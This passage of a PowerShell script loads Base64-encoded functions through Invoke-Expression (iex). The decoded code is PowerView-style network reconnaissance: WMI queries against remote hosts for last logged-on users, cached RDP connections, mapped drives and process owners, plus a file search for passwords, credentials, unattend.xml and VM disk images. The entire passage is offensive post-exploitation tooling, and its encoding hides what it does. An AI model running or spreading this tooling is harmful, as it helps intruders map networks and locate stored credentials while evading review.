1lIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbiB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkSEtMTSA9IDIxNDc0ODM2NTAKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU2lsZW50bHlDb250aW51ZScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwogICAgICAgICAgICAgICAgJEtleSA9ICdTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBdXRoZW50aWNhdGlvblxMb2dvblVJJwogICAgICAgICAgICAgICAgJFZhbHVlID0gJ0xhc3RMb2dnZWRPblVzZXInCiAgICAgICAgICAgICAgICAkTGFzdFVzZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS0xNLCAkS2V5LCAkVmFsdWUpLnNWYWx1ZQogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2dlZE9uJyAkTGFzdFVzZXIKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXInKQogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnTGFzdExvZ2dlZE9uXSBFcnJvciBvcGVuaW5nIHJlbW90ZSByZWdpc3RyeSBvbiAkQ29tcHV0ZXIuIFJlbW90ZSByZWdpc3RyeSBsaWtlbHkgbm90IGVuYWJsZWQuIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ0NhY2hlZFJEUENvbm5lY3Rpb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5DYWNoZWRSRFBDb25uZWN0aW9uJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgJEhLVSA9IDIxNDc0ODM2NTEKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU3RvcCcKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwogICAgICAgICAgICAgICAgJFVzZXJTSURzID0gKCRSZWcuRW51bUtleSgkSEtVLCAnJykpLnNOYW1lcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFVzZXJTSUQgaW4gJFVzZXJTSURzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNpZCAkVXNlclNJRCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbktleXMgPSAkUmVnLkVudW1WYWx1ZXMoJEhLVSwiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIpLnNOYW1lcwogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQ29ubmVjdGlvbiBpbiAkQ29ubmVjdGlvbktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdGlvbiAtbWF0Y2ggJ01SVS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRTZXJ2ZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0IiwgJENvbm5lY3Rpb24pLnNWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFRhcmdldFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlcm5hbWVIaW50JyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkU2VydmVyS2V5cyA9ICRSZWcuRW51bUtleSgkSEtVLCIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzIikuc05hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTZXJ2ZXIgaW4gJFNlcnZlcktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VybmFtZUhpbnQgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzXCRTZXJ2ZXIiLCAnVXNlcm5hbWVIaW50Jykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICRVc2VybmFtZUhpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvcjogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbl0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ01vdW50ZWREcml2ZSB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJlZ01vdW50ZWREcml2ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRIS1UgPSAyMTQ3NDgzNjUxCiAgICAgICAgICAgICRXbWlBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xpc3QnID0gJFRydWUKICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICdOYW1lc3BhY2UnID0gJ3Jvb3RcZGVmYXVsdCcKICAgICAgICAgICAgICAgICdDb21wdXRlcm5hbWUnID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRSZWcgPSBHZXQtV21pT2JqZWN0IEBXbWlBcmd1bWVudHMKICAgICAgICAgICAgICAgICRVc2VyU0lEcyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgJycpKS5zTmFtZXMgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ1MtMS01LTIxLVswLTldKy1bMC05XSstWzAtOV0rLVswLTldKyQnIH0KICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyU0lEIGluICRVc2VyU0lEcykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U2lkICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJERyaXZlTGV0dGVycyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmsiKSkuc05hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCREcml2ZUxldHRlciBpbiAkRHJpdmVMZXR0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJvdmlkZXJOYW1lID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXIiLCAnUHJvdmlkZXJOYW1lJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmVtb3RlUGF0aCA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmtcJERyaXZlTGV0dGVyIiwgJ1JlbW90ZVBhdGgnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICREcml2ZVVzZXJOYW1lID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXIiLCAnVXNlck5hbWUnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRVc2VyTmFtZSkgeyAkVXNlck5hbWUgPSAnJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlbW90ZVBhdGggLWFuZCAoJFJlbW90ZVBhdGggLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlTGV0dGVyJyAkRHJpdmVMZXR0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3ZpZGVyTmFtZScgJFByb3ZpZGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVtb3RlUGF0aCcgJFJlbW90ZVBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlVXNlck5hbWUnICREcml2ZVVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTW91bnRlZERyaXZlJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVByb2Nlc3MgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlclByb2Nlc3MnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdXaW4zMl9wcm9jZXNzJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgIEdldC1XTUlvYmplY3QgQFdtaUFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT3duZXIgPSAkXy5nZXRvd25lcigpOwogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc05hbWUnICRfLlByb2Nlc3NOYW1lCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc0lEJyAkXy5Qcm9jZXNzSUQKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICRPd25lci5Eb21haW4KICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyJyAkT3duZXIuVXNlcgogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVByb2Nlc3NdIEVycm9yIGVudW1lcmF0aW5nIHJlbW90ZSBwcm9jZXNzZXMgb24gJyRDb21wdXRlcicsIGFjY2VzcyBsaWtlbHkgZGVuaWVkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0ZpbGUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm91bmRGaWxlJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGggPSAnLlwnLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZWFyY2hUZXJtcycsICdUZXJtcycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSW5jbHVkZSA9IEAoJypwYXNzd29yZConLCAnKnNlbnNpdGl2ZSonLCAnKmFkbWluKicsICcqbG9naW4qJywgJypzZWNyZXQqJywgJ3VuYXR0ZW5kKi54bWwnLCAnKi52bWRrJywgJypjcmVkcyonLCAnKmNyZWRlbnRpYWwqJywgJyouY29uZmlnJyksCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RBY2Nlc3NUaW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0